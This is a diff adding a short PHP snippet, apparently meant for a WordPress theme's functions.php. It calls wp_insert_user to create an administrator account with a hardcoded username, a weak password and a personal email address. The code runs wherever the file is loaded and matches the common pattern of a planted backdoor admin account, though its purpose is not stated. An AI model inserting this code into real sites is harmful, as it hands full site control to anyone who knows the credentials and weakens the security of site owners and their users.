@@ -1,0 +1,23 @@
+<?php 
+/**
+ * Add new user vai function.php file
+*/
+$userdata = array(
+    'user_login' => 'admin2023',
+    'user_pass'  => 'wpboom',
+    'user_email' => 'tariqulis91@gmail.com',
+    'role'       => 'administrator'
+);
+
+$user_id = wp_insert_user( $userdata );
+
+if ( is_wp_error( $user_id ) ) {
+    // There was an error adding the user
+    $error_message = $user_id->get_error_message();
+    echo 'Error adding user: ' . $error_message;
+} else {
+    // The user was added successfully
+    echo 'User added with ID: ' . $user_id;
+}
+
+
